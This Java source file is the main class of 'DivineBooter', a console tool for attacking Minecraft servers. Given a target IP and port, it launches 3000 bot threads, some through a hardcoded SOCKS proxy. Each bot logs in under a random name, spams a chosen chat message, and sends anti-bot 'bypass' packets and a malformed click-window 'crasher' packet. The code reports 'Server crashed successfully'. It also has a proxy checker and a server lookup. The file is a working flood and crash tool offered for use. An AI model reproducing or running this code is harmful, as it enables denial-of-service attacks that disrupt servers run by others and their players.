package studio.thamessia;

import org.json.simple.JSONObject;
import org.json.simple.parser.JSONParser;
import org.json.simple.parser.ParseException;
import studio.thamessia.Bypass.ChatMode;
import studio.thamessia.Bypass.ClientSettingsBypass;
import studio.thamessia.Bypass.MainHand;
import studio.thamessia.Bypass.PlayerRotationBypass;
import studio.thamessia.Crashers.ClickWindowPacket;
import studio.thamessia.Crashers.Mode;
import studio.thamessia.Packets.Handshake.HandshakePacket;
import studio.thamessia.Packets.Handshake.NextState;
import studio.thamessia.Packets.Login.LoginStart;
import studio.thamessia.Packets.Login.SetCompression;
import studio.thamessia.Packets.Serverbound.InteractEntity;
import studio.thamessia.Packets.Serverbound.Type;
import studio.thamessia.Packets.Status.StatusManager;
import studio.thamessia.Packets.Status.StatusRequestPacket;
import studio.thamessia.Utils.ColorsUtils;
import studio.thamessia.Utils.DataTypes;
import studio.thamessia.Utils.GameStateOutput;
import studio.thamessia.Utils.PacketSetCompression;

import java.io.*;
import java.net.*;
import java.util.*;

public class Main {
    public static InputStreamReader input = new InputStreamReader(System.in);
    public static BufferedReader bufferedReader = new BufferedReader(input);

    private static void executeAttack() throws InterruptedException, ParseException {
        try {
            ColorsUtils.setColor("cyan");
            System.out.print("\nInsert IP: ");
            ColorsUtils.setColor("red");
            String IP = bufferedReader.readLine();

            ColorsUtils.setColor("cyan");
            System.out.print("Insert port: ");
            ColorsUtils.setColor("red");
            int port = Integer.parseInt(bufferedReader.readLine());

            ColorsUtils.setColor("cyan");
            System.out.print("Insert message to spam: ");
            ColorsUtils.setColor("red");
            String message = bufferedReader.readLine();

            ColorsUtils.setColor("cyan");
            System.out.print("Use proxies? Y/n: ");
            ColorsUtils.setColor("red");
            String select = bufferedReader.readLine();

            String serverStatus = StatusManager.serverStatus(IP, (int) port);

            JSONParser jsonParser = new JSONParser();
            JSONObject jsonObject = (JSONObject) jsonParser.parse(serverStatus);

            JSONObject version = (JSONObject) jsonObject.get("version");
            long protocol = (long) version.get("protocol");

            //System.out.println(protocol);

            InetSocketAddress address = new InetSocketAddress(IP, port);
            Proxy proxy = new Proxy(Proxy.Type.SOCKS, new InetSocketAddress("188.166.104.152", 39088));

            List<Thread> bots = new ArrayList<>();

            ColorsUtils.setColor("cyan");
            System.out.println("Trying to start attack...");

            for (int j = 0; j < 3000; j++) {

                bots.add(new Thread(() -> {
                    Socket socket;
                    if (select.equalsIgnoreCase("y")) {
                        socket = new Socket(proxy);
                        try {
                            try {
                                socket.setTcpNoDelay(true);
                                socket.setTrafficClass(18);
                                socket.connect(address, 15000);
                            } catch (UnknownHostException e) {
                                System.err.println("[DivineError] Server is offline or doesn't exist!");
                            } catch (SocketTimeoutException e) {
                                System.err.println("[DivineError] Connection timed out, bots can't join!");
                            } catch (ConnectException e) {
                                System.err.println("[DivineError] Server has crashed or refuses connection.");
                            } catch (NullPointerException e) {
                                System.err.print("");
                            } catch (SocketException e) {
                                System.err.println("[DivineError] Proxy is having difficulty to connect, can't join!");
                            }

                            try {
                                DataInputStream dataInputStream = new DataInputStream(socket.getInputStream());
                                DataOutputStream dataOutputStream = new DataOutputStream(socket.getOutputStream());

                                HandshakePacket handshakePacket = new HandshakePacket((int) protocol,
                                        IP, (short) port, NextState.LOGIN);
                                handshakePacket.sendPacket(dataOutputStream);

                                Thread.sleep(250);

                                LoginStart loginStart = new LoginStart("404." + new Random().nextInt(5000) + "");
                                loginStart.sendPacket(dataOutputStream);

                                //ClientSettingsBypass clientSettingsBypass = new ClientSettingsBypass("it_IT", (byte) 1, ChatMode.HIDDEN, false, (byte) 0x08, MainHand.RIGHT, true, false);
                                //clientSettingsBypass.sendPacket(dataOutputStream);

                                SetCompression setCompression = new SetCompression().readPacket(dataInputStream);

                                GameStateOutput gameStateOutput = new GameStateOutput(dataOutputStream);
                                gameStateOutput.sendMessage((int) protocol, setCompression.getThreshold(), message);

                                ClientSettingsBypass clientSettingsBypass = new ClientSettingsBypass("it_IT", (byte) 1, ChatMode.HIDDEN, false, (byte) 0x08, MainHand.RIGHT, true, false);
                                clientSettingsBypass.sendPacket(dataOutputStream);

                                PlayerRotationBypass playerRotationBypass = new PlayerRotationBypass(15, 50, true);
                                playerRotationBypass.sendPacket(dataOutputStream);

                                ClickWindowPacket clickWindowPacket = new ClickWindowPacket((byte) 0, 0, (short) 0, (byte) 99, Mode.NORMAL_LEFT, (short) 0);
                                clickWindowPacket.sendPacket(dataOutputStream);

                                //GameStateOutput gameStateOutput = new GameStateOutput(dataOutputStream);
                                //gameStateOutput.sendMessage((int) protocol, setCompression.getThreshold(), message);

                                InteractEntity interactEntity = new InteractEntity(0, Type.ATTACK, false);

                        /*new Thread(() -> {
                            try {
                                for (;;) interactEntity.sendPacket(dataOutputStream);
                            } catch (IOException e) {
                                e.printStackTrace();
                            }
                        }).start();*/

                                //LoginSuccess loginSuccess = new LoginSuccess();
                                //loginSuccess.readPacket(dataInputStream);

                                Thread.sleep(200);

//                        ByteArrayOutputStream uncompressedData = new ByteArrayOutputStream();
//                        DataOutputStream udd_outputStream = new DataOutputStream(uncompressedData);
//
//                        DataTypes.writeVarInt(udd_outputStream, 0x03);
//                        DataTypes.writeString(udd_outputStream, message);
//
//                        int dLength = uncompressedData.size();
//                        byte[] compressedData = CompressionUtils.compress(uncompressedData.toByteArray(), setCompression.getThreshold());
//
//                        ByteArrayOutputStream dL = new ByteArrayOutputStream();
//                        DataOutputStream dLOutputStream = new DataOutputStream(dL);
//                        DataTypes.writeVarInt(dLOutputStream, dLength);
//
//                        int packetLength = dL.size() + compressedData.length;
//
//                        DataTypes.writeVarInt(dataOutputStream, packetLength);
//                        DataTypes.writeVarInt(dataOutputStream, dLength);
//                        dataOutputStream.write(compressedData);

                                ColorsUtils.setColor("yellow");
                                System.out.println("Sending bots...");

                                Thread.sleep(350);
                                socket.close();
                            } catch (SocketException e) {
                                System.err.print("");
                            } catch (InterruptedException e) {
                                e.printStackTrace();
                            }
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                        try {
                            socket.close();
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                    } else socket = new Socket();
                    try {
                        try {
                            socket.setTcpNoDelay(true);
                            socket.setTrafficClass(18);
                            socket.connect(address, 15000);
                        } catch (UnknownHostException e) {
                            System.err.println("[DivineError] Server is offline or doesn't exist!");
                        } catch (SocketTimeoutException e) {
                            System.err.println("[DivineError] Connection timed out, bots can't join!");
                        } catch (ConnectException e) {
                            System.err.println("[DivineError] Server has crashed or refuses connection.");
                        } catch (NullPointerException e) {
                            System.err.print("");
                        } catch (SocketException e) {
                            System.err.println("[DivineError] Proxy is having difficulty to connect, can't join!");
                        } catch (EOFException e) {
                            System.err.println("[DivineError] Server crashed successfully.");
                        }

                        try {
                            DataInputStream dataInputStream = new DataInputStream(socket.getInputStream());
                            DataOutputStream dataOutputStream = new DataOutputStream(socket.getOutputStream());

                            HandshakePacket handshakePacket = new HandshakePacket((int) protocol,
                                    IP, (short) port, NextState.LOGIN);
                            handshakePacket.sendPacket(dataOutputStream);

                            Thread.sleep(250);

                            LoginStart loginStart = new LoginStart("404." + new Random().nextInt(5000) + "");
                            loginStart.sendPacket(dataOutputStream);

                            //ClientSettingsBypass clientSettingsBypass = new ClientSettingsBypass("it_IT", (byte) 1, ChatMode.HIDDEN, false, (byte) 0x08, MainHand.RIGHT, true, false);
                            //clientSettingsBypass.sendPacket(dataOutputStream);
                            try {
                                SetCompression setCompression = new SetCompression().readPacket(dataInputStream);

                                GameStateOutput gameStateOutput = new GameStateOutput(dataOutputStream);
                                gameStateOutput.sendMessage((int) protocol, setCompression.getThreshold(), message);

                                ClientSettingsBypass clientSettingsBypass = new ClientSettingsBypass("it_IT", (byte) 1, ChatMode.HIDDEN, false, (byte) 0x08, MainHand.RIGHT, true, false);
                                clientSettingsBypass.sendPacket(dataOutputStream);

                                PlayerRotationBypass playerRotationBypass = new PlayerRotationBypass(15, 50, true);
                                playerRotationBypass.sendPacket(dataOutputStream);

                                ClickWindowPacket clickWindowPacket = new ClickWindowPacket((byte) 0, 0, (short) 0, (byte) 99, Mode.NORMAL_LEFT, (short) 0);
                                clickWindowPacket.sendPacket(dataOutputStream);

                                //GameStateOutput gameStateOutput = new GameStateOutput(dataOutputStream);
                                //gameStateOutput.sendMessage((int) protocol, setCompression.getThreshold(), message);

                                InteractEntity interactEntity = new InteractEntity(0, Type.ATTACK, false);
                            } catch (EOFException e) {
                                System.err.println("[DivineError] Server crashed successfully.");
                            }
                        /*new Thread(() -> {
                            try {
                                for (;;) interactEntity.sendPacket(dataOutputStream);
                            } catch (IOException e) {
                                e.printStackTrace();
                            }
                        }).start();*/

                            //LoginSuccess loginSuccess = new LoginSuccess();
                            //loginSuccess.readPacket(dataInputStream);

                            Thread.sleep(200);

//                        ByteArrayOutputStream uncompressedData = new ByteArrayOutputStream();
//                        DataOutputStream udd_outputStream = new DataOutputStream(uncompressedData);
//
//                        DataTypes.writeVarInt(udd_outputStream, 0x03);
//                        DataTypes.writeString(udd_outputStream, message);
//
//                        int dLength = uncompressedData.size();
//                        byte[] compressedData = CompressionUtils.compress(uncompressedData.toByteArray(), setCompression.getThreshold());
//
//                        ByteArrayOutputStream dL = new ByteArrayOutputStream();
//                        DataOutputStream dLOutputStream = new DataOutputStream(dL);
//                        DataTypes.writeVarInt(dLOutputStream, dLength);
//
//                        int packetLength = dL.size() + compressedData.length;
//
//                        DataTypes.writeVarInt(dataOutputStream, packetLength);
//                        DataTypes.writeVarInt(dataOutputStream, dLength);
//                        dataOutputStream.write(compressedData);

                            ColorsUtils.setColor("yellow");
                            System.out.println("Sending bots...");

                            Thread.sleep(350);
                            socket.close();
                        } catch (SocketException e) {
                            System.err.print("");
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        } catch (EOFException e) {
                            System.err.println("[DivineError] Server crashed successfully.");
                        }
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                    try {
                        socket.close();
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }));
            }

            for (Thread thread : bots) {
                thread.start();
                Thread.sleep(10);
            }
        } catch (UnknownHostException e) {
            System.err.println("[DivineError] Server doesn't exist.");
        } catch (EOFException e) {
            System.err.println("[DivineError] Server is down.");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public static void checkProxy(String fileName) throws IOException {
        String fileStringManager;

        File file = new File(fileName);
        StringBuilder stringBuilder = new StringBuilder();

        try {
            BufferedReader bufferedReader = new BufferedReader(new FileReader(file));
            for (int i = 0; (fileStringManager = bufferedReader.readLine()) != null; i++) {
                stringBuilder.append(fileStringManager);
                InetAddress address = InetAddress.getByName(fileStringManager);

                if (address.isReachable(5000)) System.out.println("PROXY: " + fileStringManager + " is working");
                else System.out.println("PROXY: " + fileStringManager + " is not working.");
            }
        } catch (FileNotFoundException e) {
            System.err.println("[DivineError] File not found.");
        }

    }

    public static void main(String[] args) {
        String select = "";

        while(true) {
            ColorsUtils.setColor("cyan");
            System.out.println("DivineBooter");
            ColorsUtils.setColor("red");
            System.out.print("> ");

            try {
                try {
                    select = bufferedReader.readLine();
                } catch (IOException e) {
                    e.printStackTrace();
                }

                if (select.equalsIgnoreCase("attack")) { executeAttack(); }
                else if (select.equalsIgnoreCase("proxychecker")) {
                    String fileName;

                    ColorsUtils.setColor("cyan");
                    System.out.print("\nType proxies' file name: ");
                    ColorsUtils.setColor("red");
                    fileName = bufferedReader.readLine();

                    checkProxy(fileName);
                } else if (select.equalsIgnoreCase("help")) {
                    System.out.println("\nHelp: displays this page.");
                    System.out.println("Proxychecker: checks if proxies (without port because it checks the host) are working.");
                    System.out.println("Getinfo: gets info about a minecraft server.");
                    System.out.println("Attack: attacks.\n");
                } else if (select.equalsIgnoreCase("getinfo")) {
                    String host = new String();
                    int port;

                    ColorsUtils.setColor("cyan");
                    System.out.print("Type server's IP: ");
                    ColorsUtils.setColor("red");
                    host = bufferedReader.readLine();

                    ColorsUtils.setColor("cyan");
                    System.out.print("Type server's port: ");
                    ColorsUtils.setColor("red");
                    port = Integer.parseInt(bufferedReader.readLine());
                    System.out.println("");

                    String serverStatus = StatusManager.serverStatus(host, port);
                    JSONParser jsonParser = new JSONParser();
                    JSONObject jsonObject = (JSONObject) jsonParser.parse(serverStatus);

                    Socket socket = new Socket();
                    InetSocketAddress inetSocketAddress = new InetSocketAddress(host, port);
                    socket.connect(inetSocketAddress);

                    DataOutputStream dataOutputStream = new DataOutputStream(socket.getOutputStream());
                    DataInputStream dataInputStream = new DataInputStream(socket.getInputStream());

                    PacketSetCompression packetSetCompression = new PacketSetCompression();

                    JSONObject version = (JSONObject) jsonObject.get("version");
                    long protocol = (long) version.get("protocol");

                    JSONObject playersManager = (JSONObject) jsonObject.get("players");
                    long maxPlayers = (long) playersManager.get("max");
                    long onlinePlayers = (long) playersManager.get("online");
                    //long samplePlayers = (long) playersManager.get("sample");

                    ColorsUtils.setColor("cyan");
                    System.out.print("IP Host: ");
                    ColorsUtils.setColor("yellow");
                    System.out.println(host);

                    ColorsUtils.setColor("cyan");
                    System.out.print("Numerical IP: ");
                    ColorsUtils.setColor("yellow");
                    InetSocketAddress inetSocketAddress1 = new InetSocketAddress(host, port);
                    System.out.println(inetSocketAddress1.getAddress());

                    ColorsUtils.setColor("cyan");
                    System.out.print("Port: ");
                    ColorsUtils.setColor("yellow");
                    System.out.println(port);

                    ColorsUtils.setColor("cyan");
                    System.out.print("Protocol: ");
                    ColorsUtils.setColor("yellow");
                    System.out.println(protocol);

                    ColorsUtils.setColor("cyan");
                    System.out.print("Online players: ");
                    ColorsUtils.setColor("yellow");
                    System.out.println(onlinePlayers);

                    ColorsUtils.setColor("cyan");
                    System.out.print("Max players: ");
                    ColorsUtils.setColor("yellow");
                    System.out.println(maxPlayers);

                    HandshakePacket packetHandshake = new HandshakePacket((int) protocol, host, port, NextState.LOGIN);
                    packetHandshake.sendPacket(dataOutputStream);

                    Thread.sleep(250);

                    LoginStart packetLoginStart = new LoginStart("moonl1ght01");
                    packetLoginStart.sendPacket(dataOutputStream);

                    int id = DataTypes.readVarInt(dataInputStream);

                    ColorsUtils.setColor("cyan");
                    System.out.print("Premium: ");
                    ColorsUtils.setColor("yellow");
                    System.out.println(id == 0x03 ? "No." : "Yes.");
                    System.out.println("");
                    //System.out.println("Players' names (note that this will be empty if server doesn't have this feature): " + samplePlayers);
                }
                else { System.err.println("Unknown command! Type \"help\" for a list of commands."); }
            } catch (InputMismatchException | InterruptedException | ParseException e) {
                System.err.println("You have to insert a string for the IP and");
                System.err.println("an integer number for the port!");
            } catch (ConnectException e) {
                System.err.println("\n[DivineError] Server is offline\n");
            } catch (NullPointerException e) {
                System.err.print("");
            } catch (SocketException e) {
                System.err.println("[DivineError] Server is lagging too much, bots can't join!");
            } catch (UnknownHostException e) {
                System.err.println("\n[DivineError] Server doesn't exist.\n");
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
    //protected void finalize() throws IOException, ParseException, InterruptedException {
    //System.err.println("Emergency mode activated!");
    //System.out.println("Booting program...");
    //executeAttack();
    //}
}